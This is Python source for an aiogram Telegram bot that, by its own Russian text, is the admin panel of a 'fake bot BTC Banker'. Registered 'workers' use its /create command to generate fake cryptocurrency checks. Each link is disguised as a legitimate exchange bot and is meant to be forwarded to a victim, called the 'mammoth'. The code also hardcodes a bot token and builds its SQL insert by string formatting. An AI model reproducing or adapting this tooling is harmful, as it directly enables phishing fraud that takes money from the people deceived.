from aiogram import Dispatcher, types, Bot, executor
from aiogram.types import ParseMode
from aiogram.types.bot_command import BotCommand
from aiogram.dispatcher import FSMContext
from aiogram.utils.markdown import hlink
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
from random import randint
import asyncio
import sqlite3
import hashlib
import requests

TOKEN = "2062003303:AAGCW5aAhkZW3rAoLFWe9DWX6QjmDNyemHQ" # Токен админ-бота
MAIN_BOT_USERNAME = "BTC_CHANIGE_BOT" # Тег основного бота БЕЗ СОБАЧКИ

currencies = ["BTC", "RUB"]
data = {}

class shandl(StatesGroup):
    currency = State()
    amount = State()

def rub2btc(amount):
    btcrate = round(float(amount)/float(requests.get("https://api.coindesk.com/v1/bpi/currentprice/RUB.json").json()["bpi"]["RUB"]["rate"].replace(",", "")), 8)
    return str(btcrate)

def btc2rub(amount):
    btcrate = round(float(amount) * float(requests.get("https://api.coindesk.com/v1/bpi/currentprice/RUB.json").json()["bpi"]["RUB"]["rate"].replace(",", "")), 2)
    return str(btcrate)

async def help_start(message: types.Message):
    conn = sqlite3.connect("workers.db")
    cur = conn.cursor()
    workerids = cur.execute("SELECT id FROM ids").fetchall()
    conn.close()
    isworker = False
    for wid in workerids:
        if message.chat.id in wid:
            isworker = True
            break
    if not isworker:
        return
    await bot.send_message(message.chat.id, "Привет, это панель фейк бота BTC Banker.\nДоступные команды:\n\n/create - создать фейковый чек")

async def add_start(message: types.Message):
    conn = sqlite3.connect("workers.db")
    cur = conn.cursor()
    workerids = cur.execute("SELECT id FROM ids").fetchall()
    conn.close()
    isworker = False
    for wid in workerids:
        if message.chat.id in wid:
            isworker = True
            break
    if not isworker:
        return
    await bot.send_message(message.chat.id, "Введите валюту (BTC/RUB)")
    await shandl.currency.set()

async def add_amount(message: types.Message, state: FSMContext):
    if message.text not in currencies:
        await bot.send_message(message.chat.id, "Вы указали не BTC/RUB!")
        return
    data["currency"] = message.text
    await state.update_data(chosen_currency=message.text)
    await shandl.next()
    await bot.send_message(message.chat.id, "Введите сумму в указанной вами валюте (без BTC/RUB)")

async def creating_code(message: types.Message, state: FSMContext):
    data["workername"] = message.chat.username
    if data["currency"] == "BTC":
        data["btc"] = message.text
        data["rub"] = btc2rub(message.text)
    elif data["currency"] == "RUB":
        data["rub"] = message.text
        data["btc"] = rub2btc(message.text)
    user_data = await state.get_data()
    await state.finish()
    codename = "c_" + hashlib.md5(str(randint(1, 999999)).encode()).hexdigest()
    conn = sqlite3.connect("codedb.db")
    cur = conn.cursor()
    cur.execute("INSERT INTO codes(code,workername,rubcur,btccur) VALUES(\"{}\",\"{}\",\"{}\",\"{}\")".format(codename, data["workername"], data["rub"], data["btc"]))
    conn.commit()
    conn.close()
    await bot.send_message(message.chat.id, "Чек успешно создан! Ссылка на него без скрытия:\nhttps://telegram.me/" + MAIN_BOT_USERNAME.upper() + "?start=" + codename + "\nНиже сообщение со скрытой ссылкой. По желанию, вы можете переслать его мамонту.", parse_mode=ParseMode.HTML)
    await bot.send_message(message.chat.id, hlink(f"https://telegram.me/BTC_CHANGE_BOT?start={codename}", f"https://telegram.me/{MAIN_BOT_USERNAME.upper()}?start={codename}"), parse_mode=ParseMode.HTML)

def register_handlers(dp: Dispatcher):
    dp.register_message_handler(help_start, commands="start")
    dp.register_message_handler(add_start, commands="create", state="*")
    dp.register_message_handler(add_amount, state=shandl.currency)
    dp.register_message_handler(creating_code, state=shandl.amount)

async def set_commands(bot: Bot):
    commands = [
        BotCommand(command="/start", description="Начать"),
        BotCommand(command="/create", description="Создать чек"),
    ]
    await bot.set_my_commands(commands)

async def main():
    global bot
    bot = Bot(token=TOKEN)
    dp = Dispatcher(bot, storage=MemoryStorage())
    register_handlers(dp)
    await set_commands(bot)
    await dp.start_polling()

if __name__ == '__main__':
    asyncio.run(main())